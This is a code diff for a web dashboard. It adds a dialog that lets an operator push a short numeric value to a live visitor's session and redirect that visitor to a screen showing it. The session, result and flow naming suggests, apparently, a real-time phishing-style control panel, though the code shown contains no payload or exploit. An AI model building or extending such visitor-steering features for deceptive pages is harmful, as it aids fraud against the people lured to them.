@@ -1905,7 +1905,9 @@ async function applyBulkResults(page, action, resultIds) {
 }
 
 function commandStatusLabel(command = null) {
-  if (command?.action === "displayValue" && command.value) return "Value shown to visitor";
+  if (command?.action === "displayValue" && command.value) {
+    return command.targetUrl ? `Value sent · redirecting to ${command.note || "page"}` : "Value shown to visitor";
+  }
   if (!command?.targetUrl) return "No command queued";
   const label = command.note || command.targetUrl;
   if (command.status === "delivered") return `Delivered: ${label}`;
@@ -1959,6 +1961,111 @@ function sessionCurrentFlowFile(session = null, latestResult = null, command = n
   );
 }
 
+function pushValueScreens(page) {
+  const screens = Array.isArray(page?.packageManifest?.screens) ? page.packageManifest.screens : [];
+  return screens.filter((screen) => screen.allowPushValue);
+}
+
+function openPushValueDialog(pageSlug, sessionId) {
+  const page = getPageBySlug(pageSlug);
+  if (!page || !sessionId) return;
+  const screens = pushValueScreens(page);
+  if (!screens.length) return;
+
+  const backdrop = document.createElement("div");
+  backdrop.className = "push-dialog-backdrop";
+  backdrop.setAttribute("role", "dialog");
+  backdrop.setAttribute("aria-modal", "true");
+  backdrop.setAttribute("aria-label", "Push value to visitor");
+
+  const primary = screens[0];
+  const destinationSelect = screens.length > 1
+    ? `<label class="push-dialog-field"><span>Send visitor to</span><select data-push-target>${screens
+        .map((screen) => `<option value="${escapeHtml(screen.id)}" data-file="${escapeHtml(screen.file)}">${escapeHtml(screen.name || screen.label || screen.file)}</option>`)
+        .join("")}</select></label>`
+    : `<p class="push-dialog-note">Visitor is sent to <strong>${escapeHtml(primary.name || primary.label || primary.file)}</strong>, where the value is shown.</p><input type="hidden" data-push-target value="${escapeHtml(primary.id)}" data-file="${escapeHtml(primary.file)}">`;
+
+  backdrop.innerHTML = `
+    <section class="push-dialog" tabindex="-1" aria-labelledby="pushDialogTitle">
+      <header class="push-dialog-head">
+        <h3 id="pushDialogTitle">Push value to visitor</h3>
+        <button type="button" class="push-dialog-close" data-push-cancel aria-label="Close dialog">&times;</button>
+      </header>
+      <p class="push-dialog-lead">Enter the value, then the visitor is redirected to the page that displays it &mdash; the value is already there when they arrive.</p>
+      ${destinationSelect}
+      <label class="push-dialog-field"><span>Value</span><input type="text" inputmode="numeric" maxlength="64" autocomplete="off" data-push-value placeholder="Value to display"></label>
+      <footer class="push-dialog-actions">
+        <button type="button" data-push-cancel>Cancel</button>
+        <button type="button" class="is-primary" data-push-confirm>Push &amp; redirect</button>
+      </footer>
+    </section>
+  `;
+  document.body.appendChild(backdrop);
+
+  const panel = backdrop.querySelector(".push-dialog");
+  const valueInput = backdrop.querySelector("[data-push-value]");
+  const confirmBtn = backdrop.querySelector("[data-push-confirm]");
+
+  function close() {
+    document.removeEventListener("keydown", onKey, true);
+    if (backdrop.parentNode) backdrop.parentNode.removeChild(backdrop);
+  }
+  function onKey(event) {
+    if (event.key === "Escape") {
+      event.preventDefault();
+      close();
+    } else if (event.key === "Enter" && document.activeElement === valueInput) {
+      event.preventDefault();
+      submit();
+    }
+  }
+  function submit() {
+    const value = valueInput.value.trim();
+    if (!value) {
+      valueInput.focus();
+      valueInput.classList.add("is-invalid");
+      return;
+    }
+    const targetInput = backdrop.querySelector("[data-push-target]");
+    let targetScreenId = "";
+    let targetFile = "";
+    if (targetInput) {
+      targetScreenId = targetInput.value;
+      const selectedOption = targetInput.selectedOptions && targetInput.selectedOptions[0];
+      targetFile = (selectedOption && selectedOption.getAttribute("data-file"))
+        || targetInput.getAttribute("data-file")
+        || "";
+    }
+    close();
+    pushValueToVisitor(page, sessionId, value, targetScreenId, targetFile);
+  }
+
+  backdrop.addEventListener("click", (event) => {
+    if (event.target === backdrop || event.target.closest("[data-push-cancel]")) close();
+  });
+  confirmBtn.addEventListener("click", submit);
+  valueInput.addEventListener("input", () => valueInput.classList.remove("is-invalid"));
+  document.addEventListener("keydown", onKey, true);
+  panel.focus();
+  valueInput.focus();
+}
+
+function pushValueToVisitor(page, sessionId, value, targetScreenId, targetFile) {
+  if (statusText) statusText.textContent = "PUSHING VALUE…";
+  runResultsMutation(async () => {
+    const result = await requestApi(`/api/user-pages/${page.id}/sessions/${encodeURIComponent(sessionId)}/command`, {
+      method: "POST",
+      body: JSON.stringify({ action: "displayValue", value, targetScreenId, targetFile })
+    });
+    const updated = normalizeUserPage(result.userPage);
+    ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
+    await renderResultsCenter(pageRouteKey(updated));
+    if (statusText) statusText.textContent = "VALUE PUSHED · VISITOR REDIRECTED";
+  }).catch((error) => {
+    if (statusText) statusText.textContent = `PUSH FAILED: ${safeErrorMessage(error)}`.toUpperCase();
+  });
+}
+
 function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = null, currentLabel = "", currentFile = "") {
   const currentKey = normalizeFlowLabel(currentLabel);
   const currentFileKey = normalizedRuntimeScreenFile(currentFile).toLowerCase();
@@ -1992,11 +2099,11 @@ function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = n
       <small class="${command?.status === "delivered" ? "is-delivered" : command?.targetUrl ? "is-queued" : ""}">${escapeHtml(commandStatusLabel(command))}</small>
       <div class="session-push" ${pageAllowsPush ? "" : "hidden"}>
         <strong class="flow-command-title">Push to visitor</strong>
+        <p class="session-push-hint">Enter a value, then the visitor is sent to the page that displays it.</p>
         <div class="session-push-row">
-          <input type="text" inputmode="numeric" maxlength="64" autocomplete="off" placeholder="Value" data-session-push-value="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}"${pushDisabled}>
-          <button type="button" data-session-push="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}"${pushDisabled}>Push</button>
+          <button type="button" data-session-push="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}"${pushDisabled}>Push value</button>
         </div>
-        ${command?.action === "displayValue" ? `<small class="is-queued">Showing: ${escapeHtml(command.value)}</small>` : ""}
+        ${command?.action === "displayValue" ? `<small class="is-queued">Showing: ${escapeHtml(command.value)}${command.targetUrl ? " · redirecting" : ""}</small>` : ""}
       </div>
     </div>
   `;
@@ -9553,26 +9660,7 @@ preview.addEventListener("click", async (event) => {
     const resultPage = getPageBySlug(sessionPushButton.dataset.sessionPage);
     const sessionId = sessionPushButton.dataset.sessionPush;
     if (!resultPage || !sessionId) return;
-    const pushContainer = sessionPushButton.closest(".session-command");
-    const valueInput = pushContainer?.querySelector("[data-session-push-value]");
-    const value = valueInput?.value?.trim() || "";
-    if (!value) {
-      statusText.textContent = "ENTER A VALUE TO PUSH";
-      valueInput?.focus();
-      return;
-    }
-    await withButtonBusy(sessionPushButton, "Pushing", () => runResultsMutation(async () => {
-      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/command`, {
-        method: "POST",
-        body: JSON.stringify({ action: "displayValue", value })
-      });
-      const updated = normalizeUserPage(result.userPage);
-      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
-      await renderResultsCenter(pageRouteKey(updated));
-      statusText.textContent = "VALUE PUSHED TO LIVE USER";
-    })).catch((error) => {
-      statusText.textContent = `PUSH FAILED: ${safeErrorMessage(error)}`.toUpperCase();
-    });
+    openPushValueDialog(sessionPushButton.dataset.sessionPage, sessionId);
     return;
   }
 
